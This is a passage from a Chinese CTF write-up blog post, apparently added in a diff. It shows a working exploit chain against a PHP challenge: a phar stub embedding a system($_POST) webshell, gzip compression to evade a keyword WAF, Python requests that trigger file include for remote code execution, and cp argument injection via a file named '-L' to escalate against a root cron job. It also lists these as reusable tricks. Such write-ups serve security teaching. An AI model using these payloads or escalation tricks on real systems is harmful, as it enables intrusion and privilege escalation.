+<span class="line"><span style="color:#CDD6F4">$p</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">addFromString</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'a.txt'</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> 'aaaa'</span><span style="color:#9399B2">);</span></span>
+<span class="line"><span style="color:#CDD6F4">$p</span><span style="color:#94E2D5">-></span><span style="color:#89B4FA;font-style:italic">stopBuffering</span><span style="color:#9399B2">();</span></span></code></pre>
+<p>stub 直接写 <code>system($_POST["cmd"])</code>，这样每次 include 都带命令执行，不用额外写 webshell。</p>
+<p>再 gzip：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CBA6F7">import</span><span style="color:#CDD6F4"> gzip</span></span>
+<span class="line"><span style="color:#CDD6F4">gz </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> gzip</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">compress</span><span style="color:#9399B2">(</span><span style="color:#FAB387;font-style:italic">open</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1">'exp.phar'</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1">'rb'</span><span style="color:#9399B2">).</span><span style="color:#89B4FA">read</span><span style="color:#9399B2">(),</span><span style="color:#FAB387"> 9</span><span style="color:#9399B2">)</span></span></code></pre>
+<h2 id="五rce">五、RCE</h2>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#9399B2;font-style:italic"># 1) 写 gz 到 /tmp/&#x3C;md5>.phar</span></span>
+<span class="line"><span style="color:#CDD6F4">r </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> requests</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">post</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">BASE</span><span style="color:#9399B2">,</span></span>
+<span class="line"><span style="color:#EBA0AC;font-style:italic">                  data</span><span style="color:#94E2D5">=</span><span style="color:#9399B2">{</span><span style="color:#A6E3A1">'1'</span><span style="color:#9399B2">:</span><span style="color:#A6E3A1"> 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}'</span><span style="color:#9399B2">},</span></span>
+<span class="line"><span style="color:#EBA0AC;font-style:italic">                  files</span><span style="color:#94E2D5">=</span><span style="color:#9399B2">{</span><span style="color:#A6E3A1">'0'</span><span style="color:#9399B2">:</span><span style="color:#9399B2"> (</span><span style="color:#FAB387">None</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> gz</span><span style="color:#9399B2">)})</span></span>
+<span class="line"><span style="color:#CDD6F4">path </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> re</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">search</span><span style="color:#9399B2">(</span><span style="color:#A6E3A1;font-style:italic">r</span><span style="color:#F5C2E7">'</span><span style="color:#A6E3A1">/tmp/</span><span style="color:#9399B2">[</span><span style="color:#A6E3A1">0-9a-f</span><span style="color:#9399B2">]</span><span style="color:#94E2D5">{32}</span><span style="color:#F5C2E7">\.</span><span style="color:#A6E3A1">phar</span><span style="color:#F5C2E7">'</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> r</span><span style="color:#9399B2">.</span><span style="color:#CDD6F4">text</span><span style="color:#9399B2">).</span><span style="color:#89B4FA">group</span><span style="color:#9399B2">(</span><span style="color:#FAB387">0</span><span style="color:#9399B2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#9399B2;font-style:italic"># 2) include 它，触发 stub</span></span>
+<span class="line"><span style="color:#CDD6F4">r </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> requests</span><span style="color:#9399B2">.</span><span style="color:#89B4FA">post</span><span style="color:#9399B2">(</span><span style="color:#CDD6F4">BASE</span><span style="color:#9399B2">,</span></span>
+<span class="line"><span style="color:#EBA0AC;font-style:italic">                  data</span><span style="color:#94E2D5">=</span><span style="color:#9399B2">{</span><span style="color:#A6E3A1">'1'</span><span style="color:#9399B2">:</span><span style="color:#A6E3A1"> 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}'</span><span style="color:#9399B2">,</span></span>
+<span class="line"><span style="color:#A6E3A1">                        'cmd'</span><span style="color:#9399B2">:</span><span style="color:#A6E3A1"> 'id'</span><span style="color:#9399B2">},</span></span>
+<span class="line"><span style="color:#EBA0AC;font-style:italic">                  files</span><span style="color:#94E2D5">=</span><span style="color:#9399B2">{</span><span style="color:#A6E3A1">'0'</span><span style="color:#9399B2">:</span><span style="color:#9399B2"> (</span><span style="color:#FAB387">None</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> path</span><span style="color:#9399B2">)})</span></span></code></pre>
+<p>返回：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span>
+<span class="line"><span>It is file</span></span></code></pre>
+<p><code>It is file</code> 说明 include 返回值非空（stub 执行完返回 1），RCE 成立。</p>
+<h2 id="六读-flagcp-参数注入">六、读 flag：cp 参数注入</h2>
+<h3 id="61-backupsh">6.1 backup.sh</h3>
+<p><code>/var/www/html</code> 下有个脚本被 root 循环执行：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#89B4FA;font-style:italic">cp</span><span style="color:#A6E3A1"> -P</span><span style="color:#CDD6F4"> *</span><span style="color:#A6E3A1"> /var/www/html/backup/</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">chmod</span><span style="color:#FAB387"> 755</span><span style="color:#A6E3A1"> -R</span><span style="color:#A6E3A1"> /var/www/html/backup/</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">sleep</span><span style="color:#FAB387"> 10</span></span></code></pre>
+<ul>
+<li><code>-P</code>：<strong>不</strong>跟随软链接（只复制链接本身）</li>
+<li>每 10 秒执行一次，目标目录 <code>backup</code> 是 root 所有，但我们能读</li>
+</ul>
+<h3 id="62-思路">6.2 思路</h3>
+<p>如果能让 <code>cp</code> 变成跟随软链接（<code>-L</code>），那么 <code>flag -> /flag</code> 这个软链接就会被复制成<strong>真实文件内容</strong>，且随后 <code>chmod 755</code>，就能读了。</p>
+<p>问题：怎么改 <code>cp -P</code> 的参数？</p>
+<h3 id="63--展开--参数覆盖">6.3 <code>*</code> 展开 + 参数覆盖</h3>
+<p>shell 展开 <code>*</code> 时，会把当前目录下所有非隐藏文件按<strong>字母序</strong>列出来。<code>-</code> 的 ASCII 是 <code>0x2D</code>，排在字母和数字前面。</p>
+<p>所以只要在当前目录建一个名字叫 <code>-L</code> 的文件：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>-L</span></span>
+<span class="line"><span>backup</span></span>
+<span class="line"><span>backup.sh</span></span>
+<span class="line"><span>flag</span></span>
+<span class="line"><span>index.php</span></span></code></pre>
+<p><code>cp -P * /var/www/html/backup/</code> 展开成：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>cp -P -L backup backup.sh flag index.php /var/www/html/backup/</span></span></code></pre>
+<p>Linux 命令参数<strong>后来者胜</strong>，<code>-P</code> 被后面的 <code>-L</code> 覆盖 → cp 跟随软链接 → <code>/flag</code> 的真实内容被复制到 <code>backup/flag</code>，再 <code>chmod 755</code>。</p>
+<h3 id="64-执行">6.4 执行</h3>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F38BA8;font-style:italic">cd</span><span style="color:#A6E3A1"> /var/www/html</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">touch</span><span style="color:#A6E3A1"> ./-L</span><span style="color:#9399B2;font-style:italic">          # 文件名就是 -L（必须用 ./ 前缀，否则被当成参数）</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">ln</span><span style="color:#A6E3A1"> -s</span><span style="color:#A6E3A1"> /flag</span><span style="color:#A6E3A1"> flag</span><span style="color:#9399B2;font-style:italic">    # 软链接</span></span></code></pre>
+<p>等 10 秒：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#89B4FA;font-style:italic">ls</span><span style="color:#A6E3A1"> -la</span><span style="color:#A6E3A1"> backup</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">-rwxr-xr-x</span><span style="color:#FAB387"> 1</span><span style="color:#A6E3A1"> root</span><span style="color:#A6E3A1"> root</span><span style="color:#FAB387"> 44</span><span style="color:#A6E3A1"> flag</span></span>
+<span class="line"><span style="color:#89B4FA;font-style:italic">cat</span><span style="color:#A6E3A1"> backup/flag</span></span></code></pre>
+<p>拿到 flag。</p>
+<h2 id="七完整流程">七、完整流程</h2>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>1. POST mode=r, 0=/etc/passwd            → 验证 include 可用</span></span>
+<span class="line"><span>2. php -d phar.readonly=0 生成 exp.phar  → gzip 成 exp.phar.gz</span></span>
+<span class="line"><span>3. POST mode=w, 0=&#x3C;gz 字节>              → 得到 /tmp/&#x3C;md5>.phar</span></span>
+<span class="line"><span>4. POST mode=r, 0=&#x3C;path>, cmd=id         → RCE</span></span>
+<span class="line"><span>5. cmd: cd /var/www/html &#x26;&#x26; touch ./-L &#x26;&#x26; ln -s /flag flag</span></span>
+<span class="line"><span>6. 等 10 秒</span></span>
+<span class="line"><span>7. cmd: cat /var/www/html/backup/flag    → flag</span></span></code></pre>
+<p>flag：</p>
+<pre class="astro-code catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>NSSCTF{6588c919-c331-438c-a1b5-3b31c1f322da}</span></span></code></pre>
+<h2 id="八踩坑">八、踩坑</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>#</th><th>现象</th><th>原因</th><th>解决</th></tr></thead><tbody><tr><td>1</td><td><code>str too long</code> 一直出现</td><td>用 <code>curl --data-urlencode</code> 时 <code>;</code> 没被编码，PHP 按 <code>;</code> 拆了 POST</td><td>换 Python <code>requests</code>，或手动编码 <code>%3B</code></td></tr><tr><td>2</td><td>Windows 上 <code>new Phar()</code> 报 <code>unable to create temporary file</code></td><td>没指定 temp 目录</td><td><code>php -d sys_temp_dir=... -d phar.readonly=0</code></td></tr><tr><td>3</td><td>gz 上传后 include 没反应</td><td>路径里没有 <code>.phar</code></td><td>文件名必须是 <code>/tmp/xxx.phar</code>（这题固定）</td></tr><tr><td>4</td><td>写了 phar 但 include 执行的是乱码</td><td>没压缩，waf 不过 / 或 stub 写错</td><td>确认 gz 里无关键字，stub 以 <code>&#x3C;?php</code> 开头</td></tr><tr><td>5</td><td><code>touch -L</code> 报错</td><td><code>-L</code> 被当成参数</td><td>用 <code>touch ./-L</code></td></tr><tr><td>6</td><td>等 10 秒后 backup 里还是没有 flag</td><td>软链接没建 / <code>-L</code> 文件没建</td><td><code>ls -la</code> 确认两者都在</td></tr></tbody></table>
+<h2 id="九两个可复用的-trick">九、两个可复用的 trick</h2>
+<h3 id="91-压缩绕过关键字">9.1 压缩绕过关键字</h3>
+<p><strong>只要过滤发生在”文件内容”层，而解析发生在”解压后”层，就可以用压缩绕过。</strong></p>
+<ul>
+<li>phar + gzip（本题）</li>
+<li>zip + <code>zip://</code></li>
+<li>图片马 + 二次渲染（另一种思路）</li>
+</ul>
+<p>判断条件：</p>
+<ol>
+<li>能不能控制写入的字节？</li>
+<li>落地后有没有一个”会自动解压/解析”的消费方？</li>
+<li>关键字在压缩后是否确实消失？（要实际验证，不能想当然）</li>
+</ol>
+<h3 id="92-cp-参数注入">9.2 <code>cp</code> 参数注入</h3>
+<p><code>cp -X * dest/</code> 这种写法，只要能在目录里放一个以 <code>-</code> 开头的文件，就能覆盖前面的参数。</p>
+<ul>
+<li><code>-L</code>：跟随软链接 → 读 root 文件</li>
+<li><code>-r</code>：递归 → 复制目录</li>
+<li><code>--no-preserve=...</code>：改权限行为</li>
+</ul>
+<p>配合”定时备份脚本”这类 root 循环任务，就是一个稳定的提权链。</p>
+<h2 id="相关">相关</h2>
+<ul>
+<li>题解：<a href="https://www.cnblogs.com/Acc1oFl4g/p/19092325">https://www.cnblogs.com/Acc1oFl4g/p/19092325</a></li>
+</ul> </div> <nav class="series-navigation" aria-label="系列文章导航" data-astro-cid-gysqo7gh> <div class="series-navigation-heading" data-astro-cid-gysqo7gh> <div data-astro-cid-gysqo7gh><span class="section-kicker" data-astro-cid-gysqo7gh>继续阅读</span><h2 data-astro-cid-gysqo7gh>CTF Web 进阶三题</h2></div> <a class="series-all" href="/series/#ctf-web-advanced" data-astro-cid-gysqo7gh>完整目录 <span aria-hidden="true" data-astro-cid-gysqo7gh>↗</span></a> </div> <div class="series-links" data-astro-cid-gysqo7gh> <a class="series-link" href="/posts/ctf-web-advanced-2-easycleanup/" data-astro-cid-gysqo7gh> <span class="series-direction" data-astro-cid-gysqo7gh>← 上一篇</span><span class="series-name" data-astro-cid-gysqo7gh>CTF Web 进阶三题（二）—— EasyCleanup：session.upload_progress 打文件包含</span> </a> <div class="series-boundary series-link--next" data-astro-cid-gysqo7gh><span class="series-direction" data-astro-cid-gysqo7gh>已读到最新</span><span data-astro-cid-gysqo7gh>更多笔记，正在路上</span></div> </div> </nav> <footer class="article-footer" data-astro-cid-gysqo7gh><a href="/archive/" data-astro-cid-gysqo7gh>← 返回全部文章</a><a href="#article-top" data-astro-cid-gysqo7gh>回到顶部 ↑</a></footer> </article> <aside class="reading-sidebar" aria-label="阅读辅助" data-astro-cid-gysqo7gh> <div class="toc-panel glass" data-astro-cid-gysqo7gh> <div class="toc-heading" data-astro-cid-gysqo7gh><h2 data-astro-cid-gysqo7gh>本文目录</h2><span data-reading-percent data-astro-cid-gysqo7gh>0%</span></div> <nav aria-label="文章目录" data-astro-cid-gysqo7gh> <ol class="toc-list" data-astro-cid-gysqo7gh> <li data-astro-cid-gysqo7gh> <a href="#一源码" data-toc-link data-astro-cid-gysqo7gh>一、源码</a> </li><li data-astro-cid-gysqo7gh> <a href="#二分诊" data-toc-link data-astro-cid-gysqo7gh>二、分诊</a> </li><li data-astro-cid-gysqo7gh> <a href="#三卡点flag-读不了" data-toc-link data-astro-cid-gysqo7gh>三、卡点：/flag 读不了</a> </li><li data-astro-cid-gysqo7gh> <a href="#四phar--gzip绕过-waf-写马" data-toc-link data-astro-cid-gysqo7gh>四、phar + gzip：绕过 waf 写马</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#41-为什么直接写-phar-不行" data-toc-link data-astro-cid-gysqo7gh>4.1 为什么直接写 phar 不行</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#42-include-一个-phar-时-php-做了什么" data-toc-link data-astro-cid-gysqo7gh>4.2 include 一个 .phar 时 PHP 做了什么</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#43-gzip-压掉关键字" data-toc-link data-astro-cid-gysqo7gh>4.3 gzip 压掉关键字</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#44-生成-phar" data-toc-link data-astro-cid-gysqo7gh>4.4 生成 phar</a> </li><li data-astro-cid-gysqo7gh> <a href="#五rce" data-toc-link data-astro-cid-gysqo7gh>五、RCE</a> </li><li data-astro-cid-gysqo7gh> <a href="#六读-flagcp-参数注入" data-toc-link data-astro-cid-gysqo7gh>六、读 flag：cp 参数注入</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#61-backupsh" data-toc-link data-astro-cid-gysqo7gh>6.1 backup.sh</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#62-思路" data-toc-link data-astro-cid-gysqo7gh>6.2 思路</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#63--展开--参数覆盖" data-toc-link data-astro-cid-gysqo7gh>6.3 * 展开 + 参数覆盖</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#64-执行" data-toc-link data-astro-cid-gysqo7gh>6.4 执行</a> </li><li data-astro-cid-gysqo7gh> <a href="#七完整流程" data-toc-link data-astro-cid-gysqo7gh>七、完整流程</a> </li><li data-astro-cid-gysqo7gh> <a href="#八踩坑" data-toc-link data-astro-cid-gysqo7gh>八、踩坑</a> </li><li data-astro-cid-gysqo7gh> <a href="#九两个可复用的-trick" data-toc-link data-astro-cid-gysqo7gh>九、两个可复用的 trick</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#91-压缩绕过关键字" data-toc-link data-astro-cid-gysqo7gh>9.1 压缩绕过关键字</a> </li><li class="toc-subheading" data-astro-cid-gysqo7gh> <a href="#92-cp-参数注入" data-toc-link data-astro-cid-gysqo7gh>9.2 cp 参数注入</a> </li><li data-astro-cid-gysqo7gh> <a href="#相关" data-toc-link data-astro-cid-gysqo7gh>相关</a> </li> </ol> </nav> <a class="toc-back-top" href="#article-top" data-astro-cid-gysqo7gh>回到顶部 <span aria-hidden="true" data-astro-cid-gysqo7gh>↑</span></a> </div> </aside> </div> <script type="module">const c=document.querySelector("[data-reading-content]");if(c){let S=function(){const e=window.scrollY;d=b.map(i=>i.getBoundingClientRect().top+e);const t=c.getBoundingClientRect();s=Math.max(0,t.top+e-150),y=Math.max(s+1,t.bottom+e-window.innerHeight+48),m=!1},x=function(){u=0,m&&S();const e=window.scrollY,t=Math.round(Math.max(0,Math.min(1,(e-s)/(y-s)))*1e3)/1e3,i=Math.round(t*100);t!==E&&(w&&(w.style.transform=`scaleX(${t})`),E=t),i!==A&&(M.forEach(n=>{n.textContent=`${i}%`}),A=i);let f=0,h=d.length-1,q=0;for(;f<=h;){const n=f+h>>>1;d[n]<=e+160?(q=n,f=n+1):h=n-1}const g=b[q]?.id??"";g!==l&&(r.get(l)?.forEach(n=>{n.removeAttribute("data-active"),n.removeAttribute("aria-current")}),r.get(g)?.forEach(n=>{n.setAttribute("data-active",""),n.setAttribute("aria-current","location")}),l=g)},a=function(){u||(u=window.requestAnimationFrame(x))},o=function(){m=!0,a()};const w=document.querySelector("[data-reading-progress]"),M=document.querySelectorAll("[data-reading-percent]"),p=document.querySelector("[data-mobile-toc]"),v=Array.from(document.querySelectorAll("[data-toc-link]")),r=new Map;v.forEach(e=>{const t=decodeURIComponent(e.hash.slice(1));r.set(t,[...r.get(t)??[],e])});const b=Array.from(c.querySelectorAll("h2[id], h3[id]")).filter(e=>r.has(e.id));let d=[],s=0,y=1,l="",A=-1,E=-1,u=0,m=!0;if(window.addEventListener("scroll",a,{passive:!0}),window.addEventListener("resize",o,{passive:!0}),window.addEventListener("hashchange",a),window.addEventListener("load",o,{once:!0}),"ResizeObserver"in window){const e=new ResizeObserver(o);e.observe(c);const t=document.querySelector("[data-reading-article]");t&&e.observe(t)}document.fonts?.ready.then(o),v.forEach(e=>{e.addEventListener("click",()=>{p?.contains(e)&&(p.open=!1,o());const t=document.getElementById(decodeURIComponent(e.hash.slice(1)));t&&(t.setAttribute("tabindex","-1"),window.requestAnimationFrame(()=>t.focus({preventScroll:!0})))})}),a()}</script>  </main> <footer class="site-footer" data-astro-cid-sz7xmlte> <div class="footer-inner" data-astro-cid-sz7xmlte> <div class="footer-identity" data-astro-cid-sz7xmlte><a href="/" data-astro-cid-sz7xmlte>yyg<span aria-hidden="true" data-astro-cid-sz7xmlte>.</span></a><p data-astro-cid-sz7xmlte>在这里，留下一点思考。</p></div> <div class="footer-end" data-astro-cid-sz7xmlte> <nav class="footer-links" aria-label="联系与订阅" data-astro-cid-sz7xmlte><a href="https://github.com/yangpeter26-bot" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>GitHub <span aria-hidden="true" data-astro-cid-sz7xmlte>↗</span></a><a href="/rss.xml" data-astro-cid-sz7xmlte>RSS</a><a href="mailto:yangpeter26@gmail.com" data-astro-cid-sz7xmlte>联系</a></nav> <p data-astro-cid-sz7xmlte>© 2026 yyg<span class="footer-dot" aria-hidden="true" data-astro-cid-sz7xmlte>·</span>记录，学习，继续向前。</p> </div> </div> </footer>  <dialog class="search-dialog" id="search-dialog" aria-labelledby="search-heading" data-astro-cid-otpdt6jm> <div class="search-panel" data-astro-cid-otpdt6jm> <div class="search-topline" data-astro-cid-otpdt6jm><h2 id="search-heading" data-astro-cid-otpdt6jm>找一点想读的</h2><button type="button" class="search-close" id="search-close" aria-label="关闭搜索" data-astro-cid-otpdt6jm><svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-otpdt6jm><path d="m6 6 12 12M18 6 6 18" data-astro-cid-otpdt6jm></path></svg></button></div> <label class="search-input-wrap" for="site-search" data-astro-cid-otpdt6jm> <svg viewBox="0 0 24 24" aria-hidden="true" data-astro-cid-otpdt6jm><circle cx="10.8" cy="10.8" r="6.8" data-astro-cid-otpdt6jm></circle><path d="m16 16 4.5 4.5" data-astro-cid-otpdt6jm></path></svg> <input id="site-search" type="search" aria-label="搜索文章关键词" placeholder="搜索标题、摘要、标签或系列…" autocomplete="off" spellcheck="false" aria-controls="search-results" aria-describedby="search-status" data-astro-cid-otpdt6jm> <kbd aria-hidden="true" data-astro-cid-otpdt6jm>esc</kbd> </label> <div class="search-status-row" data-astro-cid-otpdt6jm><p id="search-status" role="status" aria-live="polite" data-astro-cid-otpdt6jm>输入关键词，寻找一篇文章。</p><button type="button" id="search-retry" hidden data-astro-cid-otpdt6jm>重新加载</button></div> <ul class="search-results" id="search-results" aria-label="文章搜索结果" data-astro-cid-otpdt6jm></ul> <div class="search-empty" id="search-empty" hidden data-astro-cid-otpdt6jm><span aria-hidden="true" data-astro-cid-otpdt6jm>⌕</span><p data-astro-cid-otpdt6jm>还没有找到相关内容</p><small data-astro-cid-otpdt6jm>试试短一点的关键词，比如「学习」「CNN」。</small></div> <div class="search-bottomline" data-astro-cid-otpdt6jm><span data-astro-cid-otpdt6jm>在这个小站里，发现一点新东西。</span><span class="keyboard-hint" data-astro-cid-otpdt6jm><kbd data-astro-cid-otpdt6jm>⌘</kbd> / <kbd data-astro-cid-otpdt6jm>Ctrl</kbd> <kbd data-astro-cid-otpdt6jm>K</kbd></span></div> </div> </dialog>  <script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.pFLQCv6D.js"></script> </body> </html>  
